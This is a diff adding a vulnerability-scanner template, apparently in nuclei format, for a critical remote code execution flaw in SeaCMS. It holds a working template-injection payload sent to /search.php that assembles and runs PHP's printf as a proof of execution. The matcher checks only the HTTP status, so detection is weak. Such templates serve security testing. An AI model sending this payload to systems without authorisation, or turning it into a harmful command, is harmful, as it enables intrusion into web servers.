@@ -1,0 +1,19 @@
+id: yaml-poc-seacms-seacms-rce-CT-530965
+info:
+  name: Yaml Poc Seacms Seacms Rce Ct 530965
+  author: converted
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-seacms-seacms-rce-CT-530965'
+  tags: rce
+  reference:
+  - https://www.jianshu.com/p/8d878330a42f
+http:
+- method: POST
+  path:
+  - /search.php
+  body: searchtype=5&searchword={if{searchpage:year}&year=:e{searchpage:area}}&area=v{searchpage:letter}&letter=al{searchpage:lang}&yuyan=(join{searchpage:jq}&jq=($_P{searchpage:ver}&&ver=OST[9]))&9[]=prin&9[]=tf(md5({{rand}}));
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
